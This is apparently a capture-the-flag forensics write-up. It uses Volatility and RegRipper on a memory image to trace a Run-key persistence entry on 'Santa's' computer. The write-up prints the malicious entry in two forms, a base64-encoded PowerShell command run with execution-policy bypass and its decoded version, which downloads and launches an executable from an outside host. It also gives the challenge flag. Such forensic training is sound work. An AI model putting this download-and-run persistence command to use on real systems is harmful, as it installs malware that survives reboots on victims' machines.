# Forensics :: Honeypot

*Although Santa just updated his infra, problems still occur. He keeps complaining about slow boot time and a blue window popping up for a split second during startup. The IT elves support suggested that he should restart his computer. Ah, classic IT support!*

For this challenge, we are provided with a memory image *persist.raw* and can use it along with Volatility to determine how someone is persisting in Santa's computer.

The first thing we want to do is check to see what registry hives are loaded in memory. We can do this with:
``` 
vol -f persist.raw windows.registry.hivelist.HiveList
```
Which gives us this output, showing we have some options for places to look:

```
Volatility 3 Framework 2.0.0
Progress:  100.00               PDB scanning finished                        
Offset  FileFullPath    File output

0x87a10370              Disabled
0x87a1c008      \REGISTRY\MACHINE\SYSTEM        Disabled
0x87a459c8      \REGISTRY\MACHINE\HARDWARE      Disabled
0x88be09c8      \Device\HarddiskVolume1\Boot\BCD        Disabled
0x8e6ac008      \SystemRoot\System32\Config\SOFTWARE    Disabled
0x962689c8      \SystemRoot\System32\Config\DEFAULT     Disabled
0xa16ec9c8      \SystemRoot\System32\Config\SECURITY    Disabled
0xa17479c8      \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT  Disabled
0xa1d09008      \SystemRoot\System32\Config\SAM Disabled
0xa1dce9c8      \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT        Disabled
0xa21aa008      \??\C:\Users\IEUser\ntuser.dat  Disabled
0xa2a0a008      \??\C:\Users\IEUser\AppData\Local\Microsoft\Windows\UsrClass.dat        Disabled
0xa5a28008      \??\C:\Users\Santa\AppData\Local\Microsoft\Windows\UsrClass.dat Disabled
0xa5a289c8      \??\C:\Users\Santa\ntuser.dat   Disabled
0xa7a73008      \??\C:\Users\sshd_server\ntuser.dat     Disabled
0xa7a7a188      \??\C:\Users\sshd_server\AppData\Local\Microsoft\Windows\UsrClass.dat   Disabled
```

We want to check the Run key, which is located at **HKCU\Software\Microsoft\Windows\CurrentVersion\Run**, because about 99% of the time, this is where commands that run on boot will show up in your registry, especially for CTF challenges.

So to check that, we want to dump any **ntuser.dat** files that we see with:

```vol -f persist.raw windows.registry.hivelist.HiveList --filter ntuser --dump```

Finally, we can run RegRipper on each of these files and see what sort of interesting things show up. Strangely enough, Santa didn't really reveal much. But we see the following command under the Run key for the sshd_server user:

``` 
Software\Microsoft\Windows\CurrentVersion\Run
LastWrite Time Thu Jan  1 00:00:00 1970 (UTC)
  cmFuZG9tCg: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -enc JABQAGEAdABoACAAPQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdwBpAG4AZABvAHcAcwBcAHcAaQBuAC4AZQB4AGUAJwA7AGkAZgAgACgALQBOAE8AVAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAJABQAGEAdABoACAALQBQAGEAdABoAFQAeQBwAGUAIABMAGUAYQBmACkAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAFAAYQB0AGgAfQBlAGwAcwBlAHsAbQBrAGQAaQByACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXAB3AGkAbgBkAG8AdwBzACcAOwAkAGYAbABhAGcAIAA9ACAAIgBIAFQAQgB7AFQAaAAzAHMAMwBfADMAbAB2ADMAcwBfADQAcgAzAF8AcgAzADQAbABsAHkAXwBtADQAbAAxAGMAMQAwAHUAcwB9ACIAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtAC8AdwBpAG4ALgBlAHgAZQAiACwAJABQAGEAdABoACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAGEAdABoAH0AJQA=
```

Decoding this from base64 and UTF-16 reveals:

```
$Path = 'C:\ProgramData\windows\win.exe';if (-NOT(Test-Path -Path $Path -PathType Leaf)){Start-Process $Path}else{mkdir 'C:\ProgramData\windows';$flag = "HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}";iex (New-Object System.Net.WebClient).DownloadFile("https://windowsliveupdater.com/win.exe",$Path);Start-Process $Path}%
```

```HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}```